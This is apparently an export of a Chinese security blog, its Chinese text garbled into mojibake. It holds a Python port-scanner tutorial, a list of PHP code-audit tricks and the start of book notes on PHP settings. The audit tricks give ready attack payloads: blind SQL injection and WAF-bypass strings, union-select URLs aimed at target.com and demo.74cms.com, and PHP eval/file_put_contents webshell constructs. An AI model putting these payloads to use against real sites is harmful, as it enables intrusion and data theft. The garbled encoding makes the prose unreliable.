å®ç°åŸç†æœ€ç®€å•çš„ç«¯å£æ‰«æå·¥å…·ä½¿ç”¨TCPè¿æ¥æ‰«æçš„æ–¹å¼ï¼Œå³åˆ©ç”¨æ“ä½œç³»ç»ŸåŸç”Ÿçš„ç½‘ç»œåŠŸèƒ½ï¼Œä¸”é€šå¸¸ä½œä¸ºSYNæ‰«æçš„æ›¿ä»£é€‰é¡¹ã€‚Nmapå°†è¿™ç§æ¨¡å¼ç§°ä¸ºè¿æ¥æ‰«æï¼Œå› ä¸ºä½¿ç”¨äº†ç±»ä¼¼Unixç³»ç»Ÿçš„connect()å‘½ä»¤ã€‚å¦‚æœè¯¥ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œæ“ä½œç³»ç»Ÿå°±èƒ½å®ŒæˆTCPä¸‰æ¬¡æ¡æ‰‹ï¼Œç„¶åç«¯å£æ‰«æå·¥å…·ä¼šç«‹å³å…³é—­åˆšå»ºç«‹çš„è¯¥è¿æ¥ï¼Œé˜²æ­¢æ‹’ç»æœåŠ¡æ”»å‡»ã€‚è¿™ç§æ‰«ææ¨¡å¼çš„ä¼˜åŠ¿æ˜¯ç”¨æˆ·æ— éœ€ç‰¹æ®Šæƒé™ã€‚ä½†ä½¿ç”¨æ“ä½œç³»ç»ŸåŸç”Ÿç½‘ç»œåŠŸèƒ½ä¸èƒ½å®ç°åº•å±‚æ§åˆ¶ï¼Œå› æ­¤è¿™ç§æ‰«ææ–¹å¼å¹¶ä¸æµè¡Œã€‚å¹¶ä¸”TCPæ‰«æå¾ˆå®¹æ˜“è¢«å‘ç°ï¼Œå°¤å…¶ä½œä¸ºç«¯å£æ¸…æ‰«çš„æ‰‹æ®µï¼šè¿™äº›æœåŠ¡ä¼šè®°å½•å‘é€è€…çš„IPåœ°å€ï¼Œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿå¯èƒ½è§¦å‘è­¦æŠ¥ã€‚è¿˜æœ‰å¦å¤–ä¸€ç§æ‰«ææ–¹å¼æ˜¯SYNæ‰«æï¼Œç«¯å£æ‰«æå·¥å…·ä¸ä½¿ç”¨æ“ä½œç³»ç»ŸåŸç”Ÿç½‘ç»œåŠŸèƒ½ï¼Œè€Œæ˜¯è‡ªè¡Œç”Ÿæˆã€å‘é€IPæ•°æ®åŒ…ï¼Œå¹¶ç›‘æ§å…¶å›åº”ã€‚è¿™ç§æ‰«ææ¨¡å¼è¢«ç§°ä¸ºâ€œåŠå¼€æ”¾æ‰«æâ€ï¼Œå› ä¸ºå®ƒä»ä¸å»ºç«‹å®Œæ•´çš„TCPè¿æ¥ã€‚ç«¯å£æ‰«æå·¥å…·ç”Ÿæˆä¸€ä¸ªSYNåŒ…ï¼Œå¦‚æœç›®æ ‡ç«¯å£å¼€æ”¾ï¼Œåˆ™ä¼šè¿”å›SYN-ACKåŒ…ã€‚æ‰«æç«¯å›åº”ä¸€ä¸ªRSTåŒ…ï¼Œç„¶ååœ¨æ¡æ‰‹å®Œæˆå‰å…³é—­è¿æ¥ã€‚å¦‚æœç«¯å£å…³é—­äº†ä½†æœªä½¿ç”¨è¿‡æ»¤ï¼Œç›®æ ‡ç«¯å£åº”è¯¥ä¼šæŒç»­è¿”å›RSTåŒ…ã€‚è¿™ç§ç²—ç•¥çš„ç½‘ç»œåˆ©ç”¨æ–¹å¼æœ‰å‡ ä¸ªä¼˜ç‚¹ï¼šç»™æ‰«æå·¥å…·å…¨æƒæ§åˆ¶æ•°æ®åŒ…å‘é€å’Œç­‰å¾…å›åº”æ—¶é•¿çš„æƒåŠ›ï¼Œå…è®¸æ›´è¯¦ç»†çš„å›åº”åˆ†æã€‚å…³äºå“ªä¸€ç§å¯¹ç›®æ ‡ä¸»æœºçš„æ‰«ææ–¹å¼æ›´ä¸å…·å¤‡å…¥ä¾µæ€§å­˜åœ¨ä¸€äº›äº‰è®®ï¼Œä½†SYNæ‰«æçš„ä¼˜åŠ¿æ˜¯ä»ä¸ä¼šå»ºç«‹å®Œæ•´çš„è¿æ¥ã€‚ç„¶è€Œï¼ŒRSTåŒ…å¯èƒ½å¯¼è‡´ç½‘ç»œå µå¡ï¼Œå°¤å…¶æ˜¯ä¸€äº›ç®€å•å¦‚æ‰“å°æœºä¹‹ç±»çš„ç½‘ç»œè®¾å¤‡ã€‚æ­¤æ¬¡ä½¿ç”¨çš„æ˜¯ç¬¬ä¸€ç§æ‰«ææ–¹å¼ï¼Œç›´æ¥åˆ©ç”¨æ“ä½œç³»ç»Ÿçš„socketè¿æ¥æ¥å£ï¼Œåˆæ­¥æµ‹è¯•ç›®æ ‡æœåŠ¡å™¨çš„ç«¯å£æ˜¯å¦å¯ä»¥è¿æ¥ï¼Œå¦‚æœå¯ä»¥åˆ™è¿”å›ç«¯å£æ‰“å¼€çŠ¶æ€ å®ç°æ­¥éª¤å¯ä»¥æŠŠç¨‹åºåˆ†æˆä¸‹é¢å‡ éƒ¨åˆ†ï¼š 1.è¯»å–ç«¯å£åŠç›®æ ‡æœåŠ¡å™¨ 2.æµ‹è¯•TCPç«¯å£è¿æ¥ 3.è¾“å‡ºå¼€æ”¾ç«¯å£ç»“æœ 1.è¯»å–ç«¯å£åŠç›®æ ‡æœåŠ¡å™¨ç›´æ¥æŠŠç›®æ ‡æœåŠ¡å™¨å’Œç«¯å£èŒƒå›´ä½œä¸ºå‚æ•°ä¼ ç»™æˆ‘ä»¬çš„ç¨‹åºï¼Œç¨‹åºè¿è¡Œå‚æ•°ï¼š python port_scan.py - ç¨‹åºä¸­ä½¿ç”¨sys.argv[]æ¥è¯»å–å¹¶åˆæ­¥å¤„ç†,å…·ä½“çš„è¯­æ³•è¯·å‚è€ƒpython sys.argv[]ç”¨æ³•ï¼š #!/usr/bin/python # -*- coding: UTF-8 -*- &apos;&apos;&apos; @Authorï¼šjoy_nick @åšå®¢ï¼šhttp://byd.dropsec.xyz/ &apos;&apos;&apos; import sys # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt; host = sys.argv[1] portstrs = sys.argv[2].split(&apos;-&apos;) start_port = int(portstrs[0]) end_port = int(portstrs[1]) 2.æµ‹è¯•TCPç«¯å£è¿æ¥æˆ‘ä»¬è¿›å…¥åˆ°ä¸€ä¸ªå¾ªç¯ï¼Œåœ¨è¿™ä¸ªå¾ªç¯ä¸­ä¾æ¬¡å¯¹ç«¯å£èŒƒå›´å†…çš„ç«¯å£è¿›è¡Œè¿æ¥æµ‹è¯•ã€‚ é¦–å…ˆè¦åœ¨æ–‡ä»¶å¼€å§‹éƒ¨åˆ†å¼•å…¥ socket åŒ…ï¼š from socket import * è¿æ¥æµ‹è¯•æ–¹æ³•æ˜¯ï¼š åˆ›å»ºsocket è°ƒç”¨connect()å‡½æ•° å…³é—­è¿æ¥ ä¾æ¬¡å®ç°å¦‚ä¸‹ï¼š è·å–ç›®æ ‡IPåœ°å€ï¼š target_ip = gethostbyname(host) è¿›å…¥å¾ªç¯å¼€å§‹è¿æ¥ï¼š opened_ports = [] for port in range(start_port, end_port + 1): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: opened_ports.append(port) é™„ï¼š 1.Python socket()ä»‹ç»åŠä½¿ç”¨æ–¹æ³• 2.Python socketç¼–ç¨‹ 3.è¾“å‡ºå¼€æ”¾ç«¯å£ç»“æœè¿™ä¸€æ­¥éª¤å¾ˆç®€å•ï¼Œåªéœ€è¦æ‰“å°opened_portsåˆ—è¡¨ï¼š print(&quot;Opened ports:&quot;) for i in opened_ports: print(i) å®Œæ•´çš„ä»£ç å¦‚ä¸‹ï¼š #!/usr/bin/python # -*- coding: utf-8 -*- &apos;&apos;&apos; @Authorï¼šjoy_nick @åšå®¢ï¼šhttp://byd.dropsec.xyz/ &apos;&apos;&apos; import sys from socket import * # port_scan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt; host = sys.argv[1] portstrs = sys.argv[2].split(&apos;-&apos;) start_port = int(portstrs[0]) end_port = int(portstrs[1]) target_ip = gethostbyname(host) opened_ports = [] for port in range(start_port, end_port): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: opened_ports.append(port) print(&quot;Opened ports:&quot;) for i in opened_ports: print(i) æ‰§è¡Œæµ‹è¯•å‘½ä»¤ä¸ºï¼š python port_scan.py 192.168.1.200 21-23 å¤šçº¿ç¨‹ç«¯å£æ‰«æå™¨ä¸Šé¢çš„ç®€å•ç¨‹åºä¸­ï¼Œæˆ‘ä»¬ä¾æ¬¡æµ‹è¯•æ¯ä¸ªç«¯å£ï¼Œå¦‚æœè¦æé«˜æ€§èƒ½ï¼Œå¯ä»¥è€ƒè™‘é‡‡ç”¨å¤šçº¿ç¨‹çš„æ–¹å¼ã€‚ æ”¹è¿›çš„æ–¹å¼å¦‚ä¸‹ï¼š 1.æŠŠTCPè¿æ¥æµ‹è¯•å°è£…è¿›å‡½æ•° 2.æ¯æ¬¡å¾ªç¯éƒ½åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ¥æ‰§è¡Œ1ä¸­çš„æ‰«æå‡½æ•° 3.ä¸ºäº†ç®€åŒ–å®ç°ï¼ŒæŠŠå¼€æ”¾ç«¯å£è¾“å‡ºæ­¥éª¤å†™å…¥åˆ°1çš„æµ‹è¯•å‡½æ•°ä¸­ é¦–å…ˆå¼•å…¥threadåŒ…ï¼Œè¿™ä¸ªåŒ…æ˜¯Pythonå¤šçº¿ç¨‹å®ç°éœ€è¦çš„ï¼š import thread å®ç°TCPæµ‹è¯•å‡½æ•°ï¼Œéœ€è¦æ³¨æ„printè¾“å‡ºæ—¶å€™éœ€è¦åŠ é”ï¼Œå¦‚æœä¸åŠ é”å¯èƒ½ä¼šå‡ºç°å¤šä¸ªè¾“å‡ºæ··åˆåœ¨ä¸€èµ·çš„é”™è¯¯çŠ¶æ€ï¼Œè€Œé”éœ€è¦åœ¨ç¨‹åºå¯åŠ¨æ—¶åˆ›å»ºï¼Œä»è€Œèƒ½è®©æ–°å»ºçš„çº¿ç¨‹å…±äº«è¿™ä¸ªé”ï¼š def tcp_test(port): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: lock.acquire() print &quot;Opened Port:&quot;,port lock.release() é™„ï¼š 1.Pythonçš„é” 2.å¤šçº¿ç¨‹lock.acquire() æ³¨æ„å½“è¾“å‡ºæ‰§è¡Œå®Œåè¦é‡Šæ”¾é”lockã€‚ è¾“å…¥çš„å¤„ç†åŠlockçš„åˆ›å»ºå¯ä»¥æ”¾åœ¨mainå‡½æ•°ä¸­ï¼š if __name__==&apos;__main__&apos;: # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt; host = sys.argv[1] portstrs = sys.argv[2].split(&apos;-&apos;) start_port = int(portstrs[0]) end_port = int(portstrs[1]) target_ip = gethostbyname(host) lock = thread.allocate_lock() ç„¶åä¿®æ”¹forå¾ªç¯ï¼š for port in range(start_port, end_port): thread.start_new_thread(tcp_test, (port,)) thread.start_new_thread ç”¨æ¥åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œè¯¥å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªçº¿ç¨‹ä¸­æ‰§è¡Œçš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°å¿…é¡»æ˜¯ä¸ªå…ƒç»„ï¼Œä½œä¸ºå‡½æ•°çš„è¾“å…¥ï¼Œç”±äº tcp\_test å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨(port,)è¿™ç§å½¢å¼è¡¨ç¤ºè¿™ä¸ªå‚æ•°ä¸ºå…ƒç»„ã€‚ thread.start_new_threadå‚è€ƒèµ„æ–™å¦‚ä¸‹ï¼š è¿™ä¸ªæ˜¯thread.start_new_thread(function,args[,kwargs])å‡½æ•°åŸå‹ï¼Œå…¶ä¸­functionå‚æ•°æ˜¯ä½ å°†è¦è°ƒç”¨çš„çº¿ç¨‹å‡½æ•°ï¼›argsæ˜¯è®²ä¼ é€’ç»™ä½ çš„çº¿ç¨‹å‡½æ•°çš„å‚æ•°ï¼Œå®ƒå¿…é¡»æ˜¯ä¸ªtupleç±»å‹ï¼ˆå…ƒç»„ï¼‰ï¼›è€Œkwargsæ˜¯å¯é€‰çš„å‚æ•°ã€‚çº¿ç¨‹çš„ç»“æŸä¸€èˆ¬ä¾é çº¿ç¨‹å‡½æ•°çš„è‡ªç„¶ç»“æŸï¼›ä¹Ÿå¯ä»¥åœ¨çº¿ç¨‹å‡½æ•°ä¸­è°ƒç”¨thread.exit()ï¼Œå®ƒæŠ›å‡ºSystemExit exceptionï¼Œè¾¾åˆ°é€€å‡ºçº¿ç¨‹çš„ç›®çš„ã€‚ è¿™é‡Œè¿è¡Œç¨‹åºä¼šæŠ¥é”™ï¼š Unhandled exception in thread started by sys.excepthook is missing lost sys.stderr ç½‘ä¸Šè§£é‡Šä¸ºï¼š ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šå› ä¸ºä¸»è¿›ç¨‹å·²ç»ç»“æŸï¼Œç›¸å…³çš„èµ„æºå·²ç»é‡Šæ”¾ï¼Œè€Œçº¿ç¨‹è¿˜åœ¨åå°è¿è¡Œï¼Œæ‰€ä»¥ä¼šå¯¼è‡´çº¿ç¨‹æ‰¾ä¸åˆ°ç›¸å…³çš„èµ„æºå’Œå®šä¹‰ç¬¬äºŒä¸ªé—®é¢˜ï¼šå› ä¸ºä¸»ç¨‹åºç»“æŸçš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰ç­‰å¾…å­çº¿ç¨‹ç»“æŸï¼Œä¹Ÿæ²¡æœ‰å¼ºåˆ¶å…³é—­å­çº¿ç¨‹ï¼Œå› æ­¤è¿˜åœ¨åå°è¿è¡Œï¼Œæœ‰ä¸¤ä¸ªåŠæ³•å¯ä»¥è®©ä»–ä»¬åŒæ—¶ç»“æŸï¼Œä¸€ä¸ªåŠæ³•æ˜¯åœ¨åœ¨æ„å»ºè¿›ç¨‹çš„æ—¶å€™å¢åŠ å‚æ•° deamon=True, ç¬¬äºŒä¸ªåŠæ³•å°±æ˜¯åœ¨ç¨‹åºæœ€åå¢åŠ thread1.join(),thread2.join() ä½†æ˜¯å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼Œæˆ‘çš„è§£å†³åŠæ³•ä¸ºï¼š åœ¨ä¸»å‡½æ•°ä¸ŠåŠ é‡Œä¸€ä¸ªtime.sleep(1) å®Œæ•´çš„ç¨‹åºä»£ç å¦‚ä¸‹ï¼š #!/usr/bin/python # -*- coding: UTF-8 -*- &apos;&apos;&apos; @Authorï¼šjoy_nick @åšå®¢ï¼šhttp://byd.dropsec.xyz/ &apos;&apos;&apos; import sys import thread from socket import * def tcp_test(port): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: lock.acquire() print &apos;ä¸»æœº:%s&apos;%(target_ip) print &quot;å¼€æ”¾çš„ç«¯å£ä¸º:&quot;,port print &apos;\n&apos; lock.release() thread.exit() if __name__==&apos;__main__&apos;: # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt; host = sys.argv[1] portstrs = sys.argv[2].split(&apos;-&apos;) start_port = int(portstrs[0]) end_port = int(portstrs[1]) target_ip = gethostbyname(host) lock = thread.allocate_lock() for port in range(start_port, end_port): thread.start_new_thread(tcp_test, (port,)) time.sleep(1) è¿è¡Œå®ä¾‹å¦‚ä¸‹ï¼š]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>ç¼–ç¨‹</tag>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
        <tag>Python</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPä»£ç å®¡è®¡æŠ€å·§]]></title>
    <url>%2F2016%2F08%2F23%2FPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[1ã€$_SERVER[â€˜PHP_SELFâ€™]å’Œ$_SERVER[â€˜QUERY_STRINGâ€™]ï¼Œè€Œ$_SERVERå¹¶æ²¡æœ‰è½¬ä¹‰ï¼Œé€ æˆäº†æ³¨å…¥ã€‚ ä¾‹å¦‚ï¼š /easy/index.php/aaa&apos;,(select/**/if((select/**/ord(substr(user(),1,1)))=114,sleep(3),0)),1)# 2ã€updateæ›´æ–°æ—¶æ²¡æœ‰é‡æ„æ›´æ–°åºåˆ—ï¼Œå¯¼è‡´æ›´æ–°å…¶ä»–å…³é”®å­—æ®µ ä¾‹å¦‚ï¼š id=1&amp;data=1991-03-16&amp;money=10000000 3ã€åœ¨ phpä¸­ å¦‚æœä½¿ç”¨äº†ä¸€ä¸ªæœªå®šä¹‰çš„å¸¸é‡ï¼ŒPHP å‡å®šæƒ³è¦çš„æ˜¯è¯¥å¸¸é‡æœ¬èº«çš„åå­—ï¼Œå¦‚åŒç”¨å­—ç¬¦ä¸²è°ƒç”¨å®ƒä¸€æ ·ï¼ˆCONSTANT å¯¹åº” â€œCONSTANTâ€ï¼‰ã€‚æ­¤æ—¶å°†å‘å‡ºä¸€ä¸ª E_NOTICE çº§çš„é”™è¯¯ï¼ˆå‚è€ƒhttp://php.net/manual/zh/language.constants.syntax.phpï¼‰ ä¾‹å¦‚ï¼š æœªå®šä¹‰å¸¸é‡if(IN_ADMIN != TRUE) ç­‰å¼ä¸æˆç«‹ï¼Œé0ã€nulléƒ½ä¸ºtrue 4ã€PHPä¸­è‡ªç¼–å†™å¯¹æ ‡ç­¾çš„è¿‡æ»¤æˆ–å…³é”®å­—è¿‡æ»¤ï¼Œåº”æ”¾åœ¨strip_tagsç­‰å»é™¤å‡½æ•°ä¹‹åï¼Œå¦åˆ™å¼•èµ·è¿‡æ»¤ç»•è¿‡ã€‚ ä¾‹å¦‚ï¼š function mystrip_tags($string) { $string = remove_xss($string); $string = new_html_special_chars($string); $string = strip_tags($string);//remove_xssåœ¨strip_tagsä¹‹å‰è°ƒç”¨ï¼Œæ‰€ä»¥å¾ˆæ˜æ˜¾å¯ä»¥åˆ©ç”¨strip_tagså‡½æ•°ç»•è¿‡,åœ¨å…³é”®å­—ä¸­æ’å…¥htmlæ ‡è®°. return $string; } å¯¹å…³é”®å­—è¿‡æ»¤ä¹‹åå­˜åœ¨å­—ç¬¦æ›¿æ¢ã€htmlå»é™¤ç­‰æ“ä½œå¯æ„é€ å¤šä½™å­—ç¬¦ç»•è¿‡ã€‚ ä¾‹å¦‚ï¼šæäº¤ user/**/W&lt;a&gt;HERE/**/IF((S&lt;a&gt;ELECT/**/A&lt;a&gt;SCII(S&lt;a&gt;UBSTRING(PASSWORD,1,1))F&lt;a&gt;ROM/**/ts_user/**/L&lt;a&gt;IMIT 1)=101,1=S&lt;a&gt;LEEP(2.02),0)%23 ç”±äºå…¨å±€å…³é”®å­—è¿‡æ»¤ä¹‹åå­˜åœ¨strip_tags()å‡½æ•°å¯ç»•è¿‡ã€‚ 5ã€å½“å¯æ§å˜é‡è¿›å…¥åŒå¼•å·ä¸­æ—¶å¯å½¢æˆwebshell ä¾‹å¦‚ï¼š $a = &quot;${@eval($_POST[s])}&quot;; $a = &quot;${${eval($_POST[s])}}&quot;; å› æ­¤ä»£ç æ‰§è¡Œä½¿ç”¨${file_put_contents($_GET[f],$_GET[p])}å¯ä»¥ç”Ÿæˆwebshellã€‚ 6ã€å®½å­—èŠ‚è½¬ç¼–ç è¿‡ç¨‹ä¸­å‡ºç°å®½å­—èŠ‚æ³¨å…¥ ä¾‹å¦‚ï¼šæµ‹è¯•è¾“å…¥ %e5%5c%5c&#39; ä¸¤ä¸ª\\&#39;åˆ™å•å¼•å·å‡ºæ¥ 7ã€æ„é€ æŸ¥è¯¢è¯­å¥æ—¶æ— æ³•åˆ é™¤ç›®æ ‡è¡¨ä¸­ä¸å­˜åœ¨å­—æ®µæ—¶å¯ä½¿ç”¨mysqlå¤šè¡¨æŸ¥è¯¢ç»•è¿‡ã€‚ ä¾‹å¦‚ï¼š select uid,password from users,adminsï¼›(uidå­˜åœ¨äºusersã€passwordå­˜åœ¨äºadminsï¼‰ 8ã€mysqlä¸­ï¼ˆåå¼•å·ï¼‰èƒ½ä½œä¸ºæ³¨é‡Šç¬¦ï¼Œä¸”ä¼šè‡ªåŠ¨é—­åˆæœ«å°¾æ²¡æœ‰é—­åˆçš„åå¼•å·ã€‚æ— æ³•ä½¿ç”¨æ³¨é‡Šç¬¦çš„æƒ…å†µä¸‹ä½¿ç”¨åˆ«åas+åå¼•å·å¯é—­åˆå…¶åè¯­å¥ã€‚ ä¾‹å¦‚ï¼š select username,password from pre_common_statuser as ` as statistic from common_stat where uid=1 æ­¤å¤„ï¼ˆpassword from pre_common_statuser as ï¼‰ä¸ºæ³¨å…¥è¯­å¥ï¼Œä½¿ç”¨åˆ«åasä¸è‡ªå¸¦æ— è§†å…¶åè¯­å¥ã€‚ 9ã€mysqlçš„ç±»å‹å¼ºåˆ¶è½¬æ¢å¯ç»•è¿‡PHPä¸­empty()å‡½æ•°å¯¹0çš„falseè¿”å›ã€‚ ä¾‹å¦‚ï¼šæäº¤/?test=0axxx -&gt; empty($_GET[â€˜testâ€™]) =&gt; è¿”å›çœŸ 10ã€å­˜åœ¨å…¨å±€è¿‡æ»¤æ—¶è§‚å¯Ÿè¿‡æ»¤æ¡ä»¶æ˜¯å¦æœ‰ifåˆ¤æ–­è¿›å…¥ï¼Œcmså¯èƒ½å­˜åœ¨è‡ªå®šä¹‰safekeyä¸å¯ç”¨å…¨å±€è¿‡æ»¤ã€‚é€šè¿‡ç¨‹åºé—ç•™æˆ–è€…åŸæœ‰ç•Œé¢è¾“å‡ºsafekeyå¯¼è‡´ç»•è¿‡ã€‚ ä¾‹å¦‚ï¼š if($config[&apos;sy_istemplate&apos;]!=&apos;1&apos; || md5(md5($config[&apos;sy_safekey&apos;]).$_GET[&apos;m&apos;])!=$_POST[&apos;safekey&apos;]) { foreach($_POST as $id=&gt;$v){ safesql($id,$v,&quot;POST&quot;,$config); $id = sfkeyword($id,$config); $v = sfkeyword($v,$config); $_POST[$id]=common_htmlspecialchars($v); } } 11ã€ç”±äºå…¨å±€è¿‡æ»¤å­˜åœ¨ç™½åå•é™å®šåŠŸèƒ½ï¼Œå¯ä½¿ç”¨æ— ç”¨å‚æ•°å¸¦å…¥ç»•è¿‡ã€‚ä¾‹å¦‚ï¼š if ($webscan_switch&amp;&amp;webscan_white($webscan_white_directory,$webscan_white_url)) å…¶ä¸­å…·ä½“è¿‡æ»¤ä»£ç å¦‚ä¸‹ï¼š //åå°ç™½åå•,åå°æ“ä½œå°†ä¸ä¼šæ‹¦æˆª,æ·»åŠ â€|â€éš”å¼€ç™½åå•ç›®å½•ä¸‹é¢é»˜è®¤æ˜¯ç½‘å€å¸¦ admin /dede/ æ”¾è¡Œ $webscan_white_directory=â€™admin|/dede\/|/install/â€˜; //urlç™½åå•,å¯ä»¥è‡ªå®šä¹‰æ·»åŠ urlç™½åå•,é»˜è®¤æ˜¯å¯¹phpcmsçš„åå°urlæ”¾è¡Œ //å†™æ³•ï¼šæ¯”å¦‚phpcms åå°æ“ä½œurl index.php?m=admin php168çš„æ–‡ç« æäº¤é“¾æ¥post.php?job=postnew&amp;step=post ,dedecms ç©ºé—´è®¾ç½®edit_space_info.php $webscan_white_url = array(â€˜index.phpâ€™ =&gt; â€˜admin_dir=adminâ€™,â€™post.phpâ€™ =&gt; â€˜job=postnew&amp;step=postâ€™,â€™edit_space_info.phpâ€™=&gt;â€™â€™); åªè¦è®©ä¼ å…¥å‚æ•°å­˜åœ¨ç™½åå•ç›®å½•æˆ–å‚æ•°å³å¯ç»•è¿‡ã€‚ åˆ©ç”¨ç™½åå•ç›®å½•ï¼š http://www.target.com/index.php/dede/?m=foo&amp;c=bar&amp;id=1â€˜ and 1=2 union select xxx ç”±äºè¯·æ±‚ä¸­åŒ…å«äº†ç™½åå•ç›®å½•/dede/ï¼Œæ‰€ä»¥æ”¾è¡Œã€‚ åˆ©ç”¨ç™½åå•å‚æ•°ï¼š http://www.target.com/index.php?m=foo&amp;c=bar&amp;admin_dir=admin&amp;id=1â€˜ and 1=2 union select xxx è¯·æ±‚ä¸­åŒ…å«äº†ç™½åå•å‚æ•°æ‰€ä»¥æ”¾è¡Œã€‚ 12ã€å­—ç¬¦ä¸²æˆªæ–­å‡½æ•°è·å–å®šé•¿æ•°æ®ï¼Œæˆªå–\æˆ–\â€™å‰ä¸€ä½ï¼Œé—­åˆè¯­å¥ã€‚åˆ©ç”¨æ¡ä»¶å¿…é¡»æ˜¯å­˜åœ¨ä¸¤ä¸ªå¯æ§å‚æ•°ï¼Œå‰é—­åˆï¼Œåæ³¨å…¥ã€‚ä¾‹å¦‚ï¼š if (strlen($u_email)&gt;32) { $u_email = substring($u_email,32);} if (strlen($u_qq)&gt;16) { $u_qq = substring($u_qq,16);} if (strlen($u_phone)&gt;16) { $u_phone = substring($u_phone,16);} $u_phone=123456789012345\ å¸¦å…¥ï¼š UPDATE mac_user SET u_qq=&apos;$u_qq&apos;,u_email=&apos;$u_email&apos;,u_phone=&apos;123456789012345\&apos;,u_question=&apos;$u_question&apos;,u_answer=&apos;$u_answer&apos;,u_password=&apos;$u_password&apos; WHERE u_id=1 13ã€è¿‡æ»¤äº†ç©ºæ ¼ï¼Œé€—å·çš„æ³¨å…¥ï¼Œå¯ä½¿ç”¨æ‹¬å·åŒ…è£¹ç»•è¿‡ã€‚å…·ä½“å¦‚é‡åˆ°select fromï¼ˆå…³é”®å­—ç©ºæ ¼åˆ¤æ–­çš„æ­£åˆ™ï¼Œä¸”å‰”é™¤/**/ç­‰ï¼‰å¯ä½¿ç”¨æ‹¬å·åŒ…è£¹æŸ¥è¯¢å­—æ®µç»•è¿‡ã€‚ä¾‹å¦‚ï¼š select(user)from(website); å¦å¤–ä¸€ç§æ–¹å¼ï¼š select{x table_name}from{x information_schema.tables} select{x(name)}from{x(manager)}; select{wooyun&apos;zone&apos;}from{mysql.user} select{x+table_name}from{x(information_schema.tables)} 14ã€ç”±äºPHPå¼±ç±»å‹éªŒè¯æœºåˆ¶ï¼Œå¯¼è‡´==ã€in_array()ç­‰å¯é€šè¿‡å¼ºåˆ¶è½¬æ¢ç»•è¿‡éªŒè¯ã€‚ä¾‹å¦‚ï¼š in_array($_GET[â€˜xâ€™],array(1,2,3,4,5)) è®¿é—®?test=â€™1â€™testtestå¯åˆ¤æ–­æˆåŠŸã€‚ 15ã€WAFæˆ–è€…è¿‡æ»¤äº†and|orçš„æƒ…å†µå¯ä»¥ä½¿ç”¨&amp;&amp;ä¸||è¿›è¡Œç›²æ³¨ã€‚ FALSEçš„æƒ…å†µï¼š 1 || 0 TRUEçš„æƒ…å†µï¼š 1 || 1 ä¾‹å¦‚ï¼š http://demo.74cms.com/user/user\_invited.php?id=1%20||%20strcmp(substr(user(),1,13),char(114,111,111,116,64,108,111,99,97,108,104,111,115,116))&amp;act=invited 16ã€windowsä¸‹phpä¸­è®¿é—®æ–‡ä»¶åä½¿ç”¨â€&lt;â€ â€œ&gt;â€å°†ä¼šè¢«æ›¿æ¢æˆâ€*â€ â€œ?â€ï¼Œåˆ†åˆ«ä»£è¡¨Nä¸ªä»»æ„å­—ç¬¦ä¸1ä¸ªä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼š file_get_contents(â€œ/images/â€œ.$_GET[â€˜aâ€™].â€.jpgâ€); å¯ä½¿ç”¨test.php?a=../a&lt;%00è®¿é—®å¯¹åº”phpæ–‡ä»¶ã€‚]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>MySQL</tag>
        <tag>SQLæ³¨å…¥</tag>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ã€Šä»£ç å®¡è®¡ã€‹è¯»ä¹¦ç¬”è®°]]></title>
    <url>%2F2016%2F08%2F18%2F%E3%80%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[PHPæ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼š 1.register_globals=Off(å…¨å±€å˜é‡æ³¨å†Œå¼€å…³) 2.allow_url_include=Off(æ˜¯å¦å…è®¸åŒ…å«è¿œç¨‹æ–‡ä»¶)ä¸æ­¤ç±»ä¼¼çš„è¿˜æœ‰allow_url_fopen 3.magic_quotes_gpc=On(é­”æœ¯å¼•å·è‡ªåŠ¨è¿‡æ»¤)ä¼šè‡ªåŠ¨åœ¨å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€ç©ºå­—èŠ‚(NULL)çš„å‰é¢åŠ ä¸Šåæ–œ,ä½†æ˜¯åœ¨PHP5ä¸­ä¸ä¼šè¿‡æ»¤$SERVERå˜é‡æ‰€ä»¥å¯ä»¥åˆ©ç”¨client-ipã€refererç­‰æ¼æ´ 4.magic_quotes_runtime(é­”æœ¯å¼•å·è‡ªåŠ¨è¿‡æ»¤)å’Œä¸Šé¢ä¸€æ 